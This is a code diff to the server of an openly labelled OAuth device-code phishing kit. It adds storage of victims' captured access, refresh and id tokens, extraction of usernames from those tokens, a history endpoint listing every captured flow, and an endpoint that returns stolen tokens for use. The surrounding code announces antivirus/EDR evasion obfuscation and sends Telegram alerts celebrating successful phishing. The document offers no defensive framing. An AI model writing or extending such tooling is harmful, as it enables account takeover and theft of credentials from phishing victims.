@@ -8,6 +8,9 @@ const NOTIFIED_SESSIONS = new Set();
 // Store captured tokens per session
 const CAPTURED_TOKENS = {};
 
+// Store device flows for history
+const deviceFlows = [];
+
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
 // ================================================
@@ -1244,9 +1247,23 @@ dashApp.post('/api/device-code', (req, res) => {
     deviceSessions[session_id] = {
         device_code,
         user_code,
+        session_id,
         timestamp: Date.now(),
         status: 'pending'
     };
+    
+    // Also add to deviceFlows for history
+    const existing = deviceFlows.find(f => f.user_code === user_code);
+    if (!existing) {
+        deviceFlows.push({
+            user_code: user_code,
+            device_code: device_code,
+            session_id: session_id,
+            status: 'pending',
+            created: new Date().toISOString(),
+            token_type: 'Device Code'
+        });
+    }
     
     // Send Telegram notification with the user_code
     const message = `
@@ -1296,6 +1313,23 @@ dashApp.post('/api/device-token', async (req, res) => {
         if (tokens.refresh_token) CAPTURED_TOKENS[session_id].refresh_token = tokens.refresh_token;
         if (tokens.id_token) CAPTURED_TOKENS[session_id].id_token = tokens.id_token;
         
+        // Update deviceFlows
+        const flow = deviceFlows.find(f => f.session_id === session_id || f.device_code === device_code);
+        if (flow) {
+            flow.status = 'approved';
+            flow.approved = new Date().toISOString();
+            flow.access_token = tokens.access_token;
+            flow.refresh_token = tokens.refresh_token;
+            flow.token_type = 'OAuth2';
+            if (tokens.id_token) {
+                try {
+                    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
+                    flow.username = payload.email || payload.preferred_username || 'Unknown';
+                } catch (e) {}
+            }
+            console.log(`✅ Device flow approved: ${flow.user_code}`);
+        }
+        
         // Send Telegram notification with tokens
         const message = `
 📱 **Device Code Phishing - SUCCESS!**
@@ -1319,12 +1353,54 @@ dashApp.post('/api/device-token', async (req, res) => {
         if (error.response?.data?.error === 'authorization_pending') {
             res.json({ error: 'authorization_pending' });
         } else if (error.response?.data?.error === 'expired_token') {
+            const flow = deviceFlows.find(f => f.session_id === session_id || f.device_code === device_code);
+            if (flow) {
+                flow.status = 'expired';
+            }
             res.json({ error: 'expired_token' });
         } else {
             console.error('Device token error:', error.message);
             res.status(500).json({ error: error.message });
         }
     }
+});
+
+// ── DEVICE CODE HISTORY ENDPOINTS ──
+dashApp.get('/api/device/history', (req, res) => {
+    res.json({ success: true, flows: deviceFlows });
+});
+
+dashApp.post('/api/device/manual', (req, res) => {
+    const { user_code } = req.body;
+    if (!user_code) return res.status(400).json({ error: 'Code required' });
+    
+    // Check if code already exists
+    if (deviceFlows.some(f => f.user_code === user_code.toUpperCase())) {
+        return res.status(400).json({ error: 'Code already exists' });
+    }
+    
+    const flow = {
+        user_code: user_code.toUpperCase(),
+        status: 'pending',
+        created: new Date().toISOString(),
+        session_id: Math.random().toString(36).substring(2, 15),
+        token_type: 'Manual'
+    };
+    deviceFlows.push(flow);
+    res.json({ success: true, flow });
+});
+
+dashApp.post('/api/device/use', async (req, res) => {
+    const { session_id } = req.body;
+    const flow = deviceFlows.find(f => f.session_id === session_id);
+    if (!flow || !flow.access_token) {
+        return res.status(404).json({ error: 'No token found' });
+    }
+    res.json({ 
+        success: true, 
+        access_token: flow.access_token, 
+        refresh_token: flow.refresh_token 
+    });
 });
 
 // ── ADD ROUTE FOR DEVICE CODE PAGE ──
